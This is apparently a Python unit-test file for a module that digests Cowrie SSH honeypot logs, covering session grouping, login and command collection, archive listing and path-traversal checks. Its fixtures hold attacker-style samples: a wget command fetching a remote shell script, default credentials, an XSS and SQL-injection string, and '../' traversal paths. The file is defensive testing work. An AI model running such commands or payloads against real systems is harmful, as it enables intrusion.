import contextlib
import io
import json
import os
import tempfile
import unittest
from unittest import mock

import cowrie_telemetry


def event(session, timestamp, eventid="cowrie.session.connect", **fields):
    return {"session": session, "timestamp": timestamp, "eventid": eventid, "src_ip": "203.0.113.5", **fields}


class CowrieLogTestCase(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp_dir.cleanup)
        self.log_dir = os.path.join(self.temp_dir.name, "logs")
        os.mkdir(self.log_dir)
        self.log_path = os.path.join(self.log_dir, "cowrie.json")
        patcher = mock.patch.object(cowrie_telemetry, "LOG_FILE_PATH", self.log_path)
        patcher.start()
        self.addCleanup(patcher.stop)

    def write_log(self, lines, path=None):
        """Write lines to a log file; dicts are JSON-encoded, strings are written as-is."""
        with open(path or self.log_path, "w", encoding="utf-8") as f:
            for line in lines:
                f.write((line if isinstance(line, str) else json.dumps(line)) + "\n")

    def digest(self, **kwargs):
        return cowrie_telemetry.get_cowrie_digested_logs(log_path=self.log_path, **kwargs)


class DigestedLogsTests(CowrieLogTestCase):
    def test_missing_log_file_gives_no_sessions(self):
        self.assertEqual(self.digest(), [])

    def test_empty_log_file_gives_no_sessions(self):
        self.write_log([])

        self.assertEqual(self.digest(), [])

    def test_events_are_grouped_by_session(self):
        self.write_log([
            event("aaa", "2026-10-04T10:00:00"),
            event("bbb", "2026-10-04T10:00:01", src_ip="198.51.100.7"),
            event("aaa", "2026-10-04T10:00:05", eventid="cowrie.client.version"),
        ])

        sessions = {s["session"]: s for s in self.digest()}

        self.assertEqual(set(sessions), {"aaa", "bbb"})
        self.assertEqual(len(sessions["aaa"]["events"]), 2)
        self.assertEqual(sessions["aaa"]["timestamp"], "2026-10-04T10:00:00")
        self.assertEqual(sessions["aaa"]["end_timestamp"], "2026-10-04T10:00:05")
        self.assertEqual(sessions["aaa"]["src_ip"], "203.0.113.5")
        self.assertEqual(sessions["bbb"]["src_ip"], "198.51.100.7")

    def test_successful_logins_are_collected_once_and_failures_ignored(self):
        self.write_log([
            event("aaa", "t1", eventid="cowrie.login.failed", username="root", password="wrong"),
            event("aaa", "t2", eventid="cowrie.login.success", username="root", password="123456"),
            event("aaa", "t3", eventid="cowrie.login.success", username="root", password="123456"),
            event("aaa", "t4", eventid="cowrie.login.success", username="pi", password="raspberry"),
        ])

        self.assertEqual(self.digest()[0]["logins"], ["root/123456", "pi/raspberry"])

    def test_commands_are_collected_once_in_order(self):
        self.write_log([
            event("aaa", "t1", eventid="cowrie.command.input", input="uname -a"),
            event("aaa", "t2", eventid="cowrie.command.input", input="wget http://203.0.113.9/x.sh"),
            event("aaa", "t3", eventid="cowrie.command.input", input="uname -a"),
        ])

        self.assertEqual(self.digest()[0]["commands"], ["uname -a", "wget http://203.0.113.9/x.sh"])

    def test_closed_session_records_duration(self):
        self.write_log([
            event("open", "t1"),
            event("done", "t2"),
            event("done", "t3", eventid="cowrie.session.closed", duration_ms=4200),
        ])

        sessions = {s["session"]: s for s in self.digest()}

        self.assertTrue(sessions["done"]["closed"])
        self.assertEqual(sessions["done"]["duration_ms"], 4200)
        self.assertFalse(sessions["open"]["closed"])
        self.assertEqual(sessions["open"]["duration_ms"], 0)

    def test_malformed_blank_and_sessionless_lines_are_skipped(self):
        self.write_log([
            "this is not json",
            "",
            '{"session": "aaa", "timestamp": ',
            {"timestamp": "t0", "eventid": "cowrie.no.session"},
            event("aaa", "t1"),
        ])

        sessions = self.digest()

        self.assertEqual([s["session"] for s in sessions], ["aaa"])
        self.assertEqual(len(sessions[0]["events"]), 1)

    def test_sessions_are_newest_first_and_limited(self):
        self.write_log([event(f"s{n}", f"2026-10-04T10:00:0{n}") for n in (2, 5, 1, 4, 3)])

        self.assertEqual([s["session"] for s in self.digest(limit=3)], ["s5", "s4", "s3"])

    def test_missing_optional_fields_fall_back_to_defaults(self):
        self.write_log([{"session": "aaa"}])

        session = self.digest()[0]

        self.assertEqual(session["timestamp"], "")
        self.assertEqual(session["src_ip"], "unknown")

    def test_attacker_supplied_strings_are_passed_through_unmodified(self):
        payload = "<script>alert(1)</script>'; DROP TABLE x; --"
        self.write_log([event("aaa", "t1", eventid="cowrie.command.input", input=payload)])

        self.assertEqual(self.digest()[0]["commands"], [payload])

    def test_unreadable_log_gives_no_sessions(self):
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(cowrie_telemetry.get_cowrie_digested_logs(log_path=self.log_dir), [])


class LogFileListingTests(CowrieLogTestCase):
    def test_missing_log_directory_gives_no_files(self):
        with mock.patch.object(cowrie_telemetry, "LOG_FILE_PATH", os.path.join(self.temp_dir.name, "nope", "cowrie.json")):
            self.assertEqual(cowrie_telemetry.list_cowrie_log_files(), [])

    def test_lists_only_rotated_archives_newest_name_first(self):
        self.write_log([event("live", "t1")])
        self.write_log(["x" * 9], path=os.path.join(self.log_dir, "cowrie.json.2026-10-01"))
        self.write_log(["x" * 19], path=os.path.join(self.log_dir, "cowrie.json.2026-10-03"))
        self.write_log(["x"], path=os.path.join(self.log_dir, "cowrie.log"))
        self.write_log(["x"], path=os.path.join(self.log_dir, "audit.json"))

        self.assertEqual(cowrie_telemetry.list_cowrie_log_files(), [
            {"filename": "cowrie.json.2026-10-03", "size": 20},
            {"filename": "cowrie.json.2026-10-01", "size": 10},
        ])


class SpecificLogTests(CowrieLogTestCase):
    def test_reads_an_archive_from_the_log_directory(self):
        self.write_log([event("live", "t1")])
        self.write_log([event("old", "t0")], path=os.path.join(self.log_dir, "cowrie.json.2026-10-01"))

        sessions = cowrie_telemetry.get_specific_cowrie_log("cowrie.json.2026-10-01")

        self.assertEqual([s["session"] for s in sessions], ["old"])

    def test_missing_archive_gives_no_sessions(self):
        self.assertEqual(cowrie_telemetry.get_specific_cowrie_log("cowrie.json.1999-01-01"), [])

    def test_limit_is_applied(self):
        archive = os.path.join(self.log_dir, "cowrie.json.1")
        self.write_log([event(f"s{n}", f"t{n}") for n in range(5)], path=archive)

        self.assertEqual(len(cowrie_telemetry.get_specific_cowrie_log("cowrie.json.1", limit=2)), 2)

    def test_relative_path_cannot_escape_the_log_directory(self):
        self.write_log([event("outside", "t1")], path=os.path.join(self.temp_dir.name, "outside.json"))

        self.assertEqual(cowrie_telemetry.get_specific_cowrie_log("../outside.json"), [])

    def test_only_archive_names_are_accepted(self):
        self.write_log([event("live", "t1")])
        self.write_log([event("other", "t1")], path=os.path.join(self.log_dir, "audit.json"))
        os.mkdir(os.path.join(self.log_dir, "sub"))
        self.write_log([event("nested", "t1")], path=os.path.join(self.log_dir, "sub", "cowrie.json.1"))

        for filename in ("cowrie.json", "audit.json", "sub/cowrie.json.1", "./cowrie.json", "", ".."):
            with self.subTest(filename=filename):
                self.assertEqual(cowrie_telemetry.get_specific_cowrie_log(filename), [])

    def test_absolute_path_cannot_escape_the_log_directory(self):
        outside = os.path.join(self.temp_dir.name, "outside.json")
        self.write_log([event("outside", "t1")], path=outside)

        self.assertEqual(cowrie_telemetry.get_specific_cowrie_log(outside), [])


if __name__ == "__main__":
    unittest.main()
